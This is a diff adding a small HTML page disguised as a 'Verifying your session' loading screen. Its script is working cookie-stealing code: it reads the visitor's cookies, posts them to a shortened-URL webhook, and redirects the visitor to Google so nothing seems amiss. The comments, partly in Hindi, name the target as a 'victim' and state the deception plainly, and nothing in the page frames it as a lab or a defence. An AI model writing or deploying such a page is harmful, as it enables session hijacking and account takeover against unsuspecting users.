@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body style="background-color:#ffffff; color:#333; font-family:sans-serif; text-align:center; padding-top:50px;">
+    <h2>Please wait a moment...</h2>
+    <p>Verifying your session...</p>
+
+    <script>
+        // ---------------------------------------------------------
+        // https://bit.ly/4Ak4ohT
+        // Example: var webhook = "https://short.link/xyz123";
+        // ---------------------------------------------------------
+        
+        var webhook = "https://bit.ly/4Ak4ohT"; 
+
+        // Cookies collect karna
+        var cookies = document.cookie;
+
+        // Data bhejna Webhook par
+        fetch(webhook + "?cookies=" + encodeURIComponent(cookies), {
+            method: 'POST',
+            mode: 'no-cors' 
+        }).catch(error => console.log('Error sending data:', error));
+
+        // Victim ko redirect karna (Taaki use lage sab normal hai)
+        window.location.href = "https://www.google.com";
+    </script>
+</body>
+</html>
